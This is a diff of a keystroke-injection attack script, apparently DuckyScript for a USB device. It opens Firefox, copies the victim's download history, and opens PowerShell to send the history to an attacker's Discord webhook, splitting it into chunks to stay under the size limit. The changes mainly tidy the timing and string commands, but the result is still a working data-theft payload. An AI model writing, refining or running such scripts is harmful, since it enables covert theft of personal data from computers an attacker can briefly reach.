@@ -16,31 +16,25 @@ REM     - Firefox installed
 REM You must define your Discord webhook if you want to use this method for the exfiltration
 DEFINE DISCORD_WEBHOOK example
 
+DEFAULT_DELAY 500
+
 REM Open Firefox
 GUI
 DELAY 1000
-STRING Firefox
-DELAY 500
-ENTER
+STRINGLN Firefox
 DELAY 2000
 
 REM Goto downloads and copy all
 CTRL j
-DELAY 500
 CTRL a
-DELAY 500
 CTRL c
-DELAY 500
 
 REM Open a PowerShell and put all the links into $DOWNLOADS var
 GUI r
-DELAY 500
-STRING powershell
-ENTER
+STRINGLN powershell
 DELAY 1000
 STRING $DOWNLOADS="
 CTRL v
-DELAY 500
 ENTER
 
 REM It depends on the number of links
@@ -49,15 +43,12 @@ DELAY 10000
 STRINGLN "
 
 REM Exfiltration using Discord Webhook
-STRING $WebhookUrl = "
-STRING DISCORD_WEBHOOK
-STRINGLN "
+STRINGLN $WebhookUrl = "DISCORD_WEBHOOK"
 
 STRINGLN $Payload = @{content = $DOWNLOADS} | ConvertTo-Json
 
 REM This algorithm is used to avoid the size limit imposed by Invoke-RestMethod on the payload length
-STRINGLN
-
+STRINGLN_BLOCK
     $len = $DOWNLOADS.Length
     $MAX_LEN = 1900
 
@@ -73,5 +64,4 @@ STRINGLN
         Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Payload -ContentType 'application/json'
     }
     exit;
-
 END_STRINGLN
